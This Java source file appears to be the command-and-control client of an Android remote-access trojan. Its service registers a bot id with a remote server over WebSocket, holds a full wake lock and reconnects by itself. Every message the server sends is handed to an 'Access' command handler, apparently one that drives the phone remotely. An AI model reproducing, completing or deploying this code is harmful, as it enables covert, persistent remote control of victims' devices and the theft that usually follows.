package com.service.app.vnc;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import androidx.annotation.Nullable;

import com.service.app.Services.Access;
import com.service.app.Services.utils;
import com.service.app.defines;

import org.json.JSONObject;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;
import java.util.concurrent.TimeUnit;

public class WebSocketService extends Service {

    private static final String TAG = WebSocketService.class.getSimpleName();
    private final IBinder binder = new LocalBinder();
    private WebSocket webSocket;
    private boolean isWebSocketOpen = false;
    private boolean isServiceRunning = false;
    private String id_bot = "";
    private PowerManager.WakeLock wakeLock;

    defines consts = new defines();
    utils utl = new utils();
    private final long reconnectInterval = 5000; // 5 seconds
    Access access = Access.getInstance();

    public class LocalBinder extends Binder {
        public WebSocketService getService() {
            return WebSocketService.this;
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isServiceRunning) {
            id_bot = utl.SettingsRead(this, consts.idbot);
            acquireWakeLock();
            startWebSocket();
            isServiceRunning = true;
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWakeLock();
        stopWebSocket();
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK, "WebSocketService::WakeLock");
        wakeLock.acquire();
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            wakeLock = null;
        }
    }

    private void startWebSocket() {
        OkHttpClient client = new OkHttpClient.Builder()
                .pingInterval(15, TimeUnit.SECONDS)
                .build();

        Request request;
        if (consts.ssl) {
            request = new Request.Builder()
                    .url("wss://" + consts.ws_url + "/ws")
                    .build();
        } else {
            request = new Request.Builder()
                    .url("ws://" + consts.ws_url + "/ws")
                    .build();
        }


        WebSocketListener webSocketListener = new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                isWebSocketOpen = true;
                utl.SettingsWrite(getApplicationContext(), "websocket", "1");
                Log.d(TAG, "WebSocket connection opened");
                JSONObject jsonObject = new JSONObject();
                try {
                    jsonObject.put("id", id_bot);
                    webSocket.send(jsonObject.toString());
                } catch (Exception e){
                    Log.d(TAG,e.toString());
                }
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                Log.d(TAG, "Message received: " + text);
                try {
                    access = Access.getInstance();
                    if (text != null) {
                        JSONObject jsonCommand = new JSONObject(text);
                        if (jsonCommand != null && access != null) {
                            Log.d(TAG, String.valueOf(jsonCommand.get("data")));
                            access.doCommand(jsonCommand);
                        } else if (access == null) {
                            access = Access.getInstance();
                            access.doCommand(jsonCommand);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error on performing websocket action: " + e);
                }
            }


            @Override
            public void onClosing(WebSocket webSocket, int code, String reason) {
                Log.d(TAG, "WebSocket closing.");
                isWebSocketOpen = false;
                utl.SettingsWrite(getApplicationContext(), "websocket", "0");
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                Log.d(TAG, "WebSocket closed.");
                isWebSocketOpen = false;
                utl.SettingsWrite(getApplicationContext(), "websocket", "0");
                reconnectWebSocket();
            }
            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e(TAG, "WebSocket failure: " + t.getMessage());
                isWebSocketOpen = false;
                utl.SettingsWrite(getApplicationContext(), "websocket", "0");
                reconnectWebSocket();
            }
        };

        webSocket = client.newWebSocket(request, webSocketListener);
    }

    public void sendMessage(String message) {
        if (webSocket != null && isWebSocketOpen) {
            webSocket.send(message);
        } else {
            Log.e(TAG, "WebSocket is not open. Message not sent.");
        }
    }

    private void stopWebSocket() {
        if (webSocket != null) {
            webSocket.cancel();
            webSocket = null;
        }
        utl.SettingsWrite(getApplicationContext(), "websocket", "0");
    }

    private void reconnectWebSocket() {
        if (!isWebSocketOpen) {
            try {
                Thread.sleep(reconnectInterval);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            startWebSocket();
        }
    }

}
